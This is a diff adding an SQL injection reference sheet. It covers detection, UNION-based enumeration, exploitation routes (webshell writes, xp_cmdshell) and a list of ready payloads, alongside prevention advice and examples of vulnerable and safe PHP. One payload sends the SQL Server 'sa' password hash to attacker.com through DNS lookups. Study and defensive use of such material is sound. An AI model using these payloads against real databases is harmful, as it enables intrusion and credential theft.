@@ -1,0 +1,74 @@
+### Description:
+SQL Injection (SQLi) is a critical web security vulnerability that occurs when an attacker can insert malicious SQL code into a query, potentially allowing unauthorized access to database contents, modification of data, or execution of administrative operations. It exploits poor input validation and occurs when user-supplied data is concatenated directly into SQL statements without proper sanitization.
+
+### Detection:
+- Test with single quotes: ' -> Look for SQL syntax errors
+- Test with double quotes: " -> Similar error checking
+- Boolean tests: ' OR 1=1 -- -> Bypasses authentication if vulnerable
+- Observe application behavior: Errors, delays, or unexpected results
+- Use tools to automate detection
+
+### Types:
+- Error-based: Database errors reveal information about the structure
+- Union-based: UNION SELECT to combine results and extract data
+- Blind (Boolean): True/false conditions to infer data
+- Blind (Time-based): Delays indicate true/false conditions
+- Out-of-band: Data exfiltrated to attacker's controlled server
+- Stacked queries: Multiple statements executed (e.g., ; DROP TABLE --)
+
+### Enumeration:
+- Determine column count: ORDER BY 1--, ORDER BY 2-- until error
+- Identify injectable columns: UNION SELECT NULL,NULL,NULL-- (match column count)
+- Extract database version: UNION SELECT @@version,@@datadir,@@hostname--
+- List databases: UNION SELECT schema_name FROM information_schema.schemata
+- List tables: UNION SELECT table_name FROM information_schema.tables WHERE table_schema='database_name'
+- List columns: UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'
+- Extract data: UNION SELECT username,password FROM users
+
+### Exploitation:
+- Authentication bypass: admin' -- or ' OR '1'='1
+- Data extraction: Dump user credentials, sensitive information
+- Privilege escalation: Modify admin privileges
+- File operations: INTO OUTFILE '/var/www/shell.php' (write webshells)
+- Command execution: If xp_cmdshell enabled in MSSQL
+- Database takeover: Create new admin accounts
+
+### Tools:
+- sqlmap: Automated SQL injection exploitation tool
+- Burp Suite Repeater: Manual testing and payload crafting
+- Havij: GUI-based SQL injection tool
+- SQLninja: MSSQL-specific exploitation
+- BeeF: Browser exploitation framework integration
+- Custom scripts in Python (e.g., using requests library)
+
+### Common Payloads:
+- Authentication bypass: ' OR 1=1 --
+- Union extraction: ' UNION SELECT 1,2,3 --
+- Blind boolean: ' AND (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='a
+- Time-based: ' AND IF(1=1, SLEEP(5), 0) --
+- Error-based: ' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects)) --
+- Stacked: '; EXEC xp_cmdshell 'net user' --
+- Out-of-band: '; DECLARE @host varchar(1024); SELECT @host=(SELECT TOP 1 master..sys.fn_varbintohexstr(password_hash) FROM sys.sql_logins WHERE name='sa'); EXEC('master..xp_dirtree "//'+@host+'.attacker.com/foo"') --
+
+### Prevention:
+- Use prepared statements and parameterized queries (PDO, mysqli)
+- Input validation and sanitization: Escape special characters
+- Stored procedures with proper parameter handling
+- Least privilege: Database user should have minimal permissions
+- Web Application Firewall (WAF) with SQLi rules
+- Error handling: Don't expose database errors to users
+- ORM frameworks: Hibernate, Entity Framework handle SQL safely
+- Regular security audits and penetration testing
+
+### Examples:
+- Vulnerable PHP code: $query = "SELECT * FROM users WHERE id = '" . $_GET['id'] . "'";
+- Exploitation: ?id=1' OR '1'='1
+- Safe PHP code: $stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?"); $stmt->execute([$_GET['id']]);
+
+### Questions to Ask:
+- Is user input properly sanitized and parameterized?
+- Can I perform stacked queries or multiple statements?
+- What database management system is running (MySQL, MSSQL, PostgreSQL)?
+- Is there a WAF or IDS blocking my payloads?
+- Can I extract data, modify records, or execute system commands?
+- Are there any input length restrictions or filtering in place?
